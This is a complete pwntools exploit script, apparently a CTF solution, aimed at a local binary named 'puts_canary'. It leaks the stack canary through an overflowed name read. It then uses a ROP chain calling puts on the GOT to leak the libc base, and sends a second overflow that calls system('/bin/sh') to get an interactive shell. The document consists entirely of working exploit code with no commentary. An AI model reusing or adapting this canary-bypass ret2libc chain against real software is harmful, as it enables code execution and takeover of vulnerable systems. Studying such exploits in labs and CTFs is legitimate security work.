from pwn import *
from struct import pack
from ctypes import *
import base64
#from LibcSearcher import *

def debug(c = 0):
    if(c):
        gdb.attach(p, c)
    else:
        gdb.attach(p)
        pause()
def get_sb() : return libc_base + libc.sym['system'], libc_base + next(libc.search(b'/bin/sh\x00'))
#-----------------------------------------------------------------------------------------
s = lambda data : p.send(data)
sa  = lambda text,data  :p.sendafter(text, data)
sl  = lambda data   :p.sendline(data)
sla = lambda text,data  :p.sendlineafter(text, data)
r   = lambda num=4096   :p.recv(num)
rl  = lambda text   :p.recvuntil(text)
pr = lambda num=4096 :print(p.recv(num))
inter   = lambda        :p.interactive()
l32 = lambda    :u32(p.recvuntil(b'\xf7')[-4:].ljust(4,b'\x00'))
l64 = lambda    :u64(p.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
uu32    = lambda    :u32(p.recv(4).ljust(4,b'\x00'))
uu64    = lambda    :u64(p.recv(6).ljust(8,b'\x00'))
int16   = lambda data   :int(data,16)
lg= lambda s, num   :p.success('%s -> 0x%x' % (s, num))
#-----------------------------------------------------------------------------------------

context(os='linux', arch='amd64', log_level='debug')
#p = gdb.debug('./pthread', 'b vuln')
p = process('./puts_canary')
elf = ELF('./puts_canary')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

#debug('b *0x40123a')

rdi = 0x401323
ret = 0x40101a

sa(b'name?\n', b'a'*9)
rl(b'a'*9)
canary = u64(p.recv(7).rjust(8, b'\x00'))

sa(b'>>\n', b'a'*8 + p64(canary) + p64(0) + p64(rdi) + p64(elf.got['puts']) + p64(elf.sym['puts']) + p64(elf.sym['vuln']))

libc_base = l64() - libc.sym['puts']
system, binsh = get_sb()

sa(b'name?\n', b'a'*9)
rl(b'a'*9)
canary = u64(p.recv(7).rjust(8, b'\x00'))

sa(b'>>\n', b'a'*8 + p64(canary) + p64(0) + p64(ret) + p64(rdi) + p64(binsh) + p64(system))


lg('libc_base', libc_base)	
lg('canary', canary)
#pause()
inter()

